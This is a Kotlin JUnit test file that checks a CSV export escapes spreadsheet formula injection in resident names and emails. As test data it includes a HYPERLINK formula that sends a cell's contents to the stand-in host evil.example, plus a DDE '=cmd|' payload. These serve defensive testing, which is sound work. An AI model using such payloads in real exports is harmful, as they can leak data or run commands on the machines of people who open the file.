package com.example.iurankomplek.export

import org.apache.commons.csv.CSVFormat
import org.apache.commons.csv.CSVParser
import org.apache.commons.csv.CSVPrinter
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.StringReader
import java.io.StringWriter

/**
 * Regression tests for spreadsheet formula injection (CWE-1236) in the CSV export.
 *
 * Names, e-mails and utilisation descriptions come from a spreadsheet API, so a
 * row containing `=cmd|...` would otherwise execute when the manager opens the
 * export in Excel or LibreOffice.
 */
class CsvInjectionGuardTest {

    private fun renderRow(vararg cells: String?): List<String> {
        val out = StringWriter()
        CSVPrinter(out, CSVFormat.DEFAULT).use { printer ->
            printer.printRecord(*cells.map { escapeCsvCell(it) }.toTypedArray())
        }
        return CSVParser(StringReader(out.toString()), CSVFormat.DEFAULT).use { parser ->
            parser.records.first().toList()
        }
    }

    @Test
    fun `a formula in a resident name is neutralised`() {
        val attack = "=HYPERLINK(\"http://evil.example?d=\"&A1,\"click\")"

        val cell = renderRow(attack, "john@example.com", "Maintenance", "50000")[0]

        assertTrue("cell must not start with '='", !cell.startsWith("="))
        assertTrue(cell.startsWith("'="))
        assertTrue(cell.contains("HYPERLINK"))
    }

    @Test
    fun `a formula embedded after a name is not a formula cell`() {
        val cell = renderRow("John =1+1", "john@example.com")[0]

        assertEquals("John =1+1", cell)
    }

    @Test
    fun `every spreadsheet formula trigger is escaped`() {
        listOf(
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(A1)",
            "\tcmd",
            "\rcmd"
        ).forEach { attack ->
            val cell = renderRow(attack)[0]
            assertFalse("'$attack' must not stay executable", cell.startsWith("=") || cell.startsWith("+") || cell.startsWith("-") || cell.startsWith("@"))
            assertTrue("'$attack' must be prefixed", cell.startsWith("'"))
        }
    }

    @Test
    fun `ordinary values are left untouched`() {
        val cell = renderRow("Budi Santoso", "budi@example.com", "Perbaikan jalan", "150000")[0]

        assertEquals("Budi Santoso", cell)
    }

    @Test
    fun `a value containing a formula trigger not in first position is preserved`() {
        assertEquals("Jl. REQUIRED No. 1", escapeCsvCell("Jl. REQUIRED No. 1"))
    }

    @Test
    fun `null and empty values do not crash the export`() {
        assertEquals("", escapeCsvCell(null))
        assertEquals("", escapeCsvCell(""))
    }

    @Test
    fun `a formula smuggled through the email column is also escaped`() {
        val cell = renderRow("John", "=cmd|' /C calc'!A1", "Maintenance", "1")[1]

        assertTrue(cell.startsWith("'="))
    }
}